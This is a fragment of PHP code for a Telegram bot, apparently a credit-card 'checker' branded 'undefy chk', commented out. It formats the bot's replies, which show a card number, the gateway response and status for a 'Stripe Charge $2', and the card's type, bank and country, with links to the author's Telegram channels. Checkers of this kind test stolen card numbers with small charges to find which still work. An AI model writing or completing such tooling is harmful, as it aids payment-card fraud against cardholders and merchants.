✮𝗕𝗼𝘁 𝗠𝗮𝗱𝗲 BY ➺ <a href='https://t.me/balenottere'>undefy</a> x <a href='https://t.me/undefychatchk'>join chat</a>
    －－－－－－－－－－－－－－－－",
            'parse_mode'=>'html',
            'disable_web_page_preview'=>'true'
            ]);
    }
}
else {
        bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtoedit,
            'text'=>"❆═══»undefy chk«═══❆
✮ᴄᴀʀᴅ -» <code>$lista</code> 
✮ƦESPONSE -» $msg
✮STATUS-» $pass
✮GATEWAY -» Stripe Charge $2
-———-»ɪɴꜰᴏ«-———-
✮TYPE -»  $type
✮ʙᴀɴᴋ -» $bank
✮ᴄᴏᴜɴᴛʀʏ -» $name $emoji $currency
✮Proxy -» Live..! ✅
❆═══»Undefy chk«═══❆
✮ᴄʜᴇᴄᴋᴇᴅ ʙʏ: 😈 <a href='tg://user?id=$userId'>$firstname</a> 😈 ✅️ 
✮𝗕𝗼𝘁 𝗠𝗮𝗱𝗲 BY ➺ <a href='https://t.me/balenottere'>undefy</a> x <a href='https://t.me/undefychatchk'>join chat</a>
    －－－－－－－－－－－－－－－－",
            'parse_mode'=>'html',
            'disable_web_page_preview'=>'true'
            ]);
    };
}
*/
?>
